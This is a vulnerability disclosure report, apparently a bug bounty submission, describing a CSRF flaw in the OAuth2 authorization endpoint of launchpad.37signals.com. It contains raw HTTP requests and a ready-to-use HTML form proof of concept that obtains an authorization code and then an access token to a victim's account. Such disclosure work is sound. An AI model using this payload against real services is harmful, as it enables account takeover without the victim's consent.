## Original Report

Hi,
I found a CSRF in the OAuth2 authorization endpoint on launchpad.37signals.com. That allows a malicious 3rd party application to gain full API access to  victim's  account in 37signals products  that uses OAuth2 authorization.

I found that when making a post request to ``` authorization ```  endpoint it does not check the "authenticity token" if you add " .json or .xml " like this "authorization.json" .

##post request:
```
POST /authorization.json HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Content-Length: 168
Cache-Control: max-age=0
Origin: null
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _beanstalk_uuid=

client_id={your-client-id}&type=web_server&redirect_uri={your-redirect-uri}&commit=

```


After a 3rd party application gets the authorization code from redirect_uri, it can then exchange it for an access token. and get full access to the api.

## request to get the access token:

```
POST /authorization/token HTTP/1.1
Host: launchpad.37signals.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36
Sec-Fetch-Dest: document
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _beanstalk_uuid=
Content-Type: application/x-www-form-urlencoded
Content-Length: 214

type=web_server&client_id={your-client-id}&redirect_uri={your-redirect-uri}&client_secret={your-client-secret}&code={authorization-code}

```

## PoC:

1- you will need to register on the 37Signals Integration Portal.

2- Login to any 37Signals apps that uses the OAuth2 authorization for example basecamp 3 account. (i tested it using basecamp 3 )

3- for testing , submit the following form through the browser in which you are logged in:

```
<form action="https://launchpad.37signals.com/authorization.json" method="POST">
      <input type="hidden" name="client&#95;id" value="{your-client-id}" />
      <input type="hidden" name="client&#95;secret" value="" />
      <input type="hidden" name="type" value="web&#95;server" />
      <input type="hidden" name="redirect&#95;uri" value="{your-redirect-uri}" />
      <input type="hidden" name="commit" value="" />
      <input type="submit" value="Submit request" />
    </form>
```

you will get the {authorization-code} so you can exchange it for an access token

## Note that a real attack does not require user interaction.
